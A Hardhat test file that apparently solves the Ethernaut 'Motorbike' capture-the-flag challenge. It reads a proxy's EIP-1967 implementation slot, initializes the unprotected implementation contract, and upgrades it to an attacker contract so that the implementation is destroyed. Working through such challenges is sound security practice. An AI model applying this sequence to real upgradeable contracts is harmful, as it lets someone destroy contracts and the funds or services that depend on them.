import { expect } from "chai";
import { ethers } from "hardhat";

describe("Motorbike", async function () {

  it("Should destruct the contract implementation", async function () {
    const Engine = await ethers.getContractFactory("Engine");
    const engine = await Engine.deploy();
    await engine.deployed();

    const [deployer, attacker] = await ethers.getSigners()


    const Motorbike = await ethers.getContractFactory("Motorbike");
    const motorbike = await Motorbike.deploy(engine.address);
    await motorbike.deployed();


    //---------------------------------------------
    //we can get the implementation address from
    const ImplStorage = await ethers.provider.getStorageAt(motorbike.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
    const implementationAddr = ethers.BigNumber.from(ImplStorage).toHexString()

    const implementationContract = await ethers.getContractAt('Engine', implementationAddr)
    await implementationContract.initialize();
    //creo el contrato attacante
    const MotorbikeAttacker = await ethers.getContractFactory("MotorbikeAttacker");
    const motorbikeAttacker = await MotorbikeAttacker.deploy();

    await implementationContract.upgradeToAndCall(motorbikeAttacker.address, "0x01")
    const bytecode = await ethers.provider.getCode(implementationContract.address);
    expect(bytecode).to.eq("0x")
  });

});

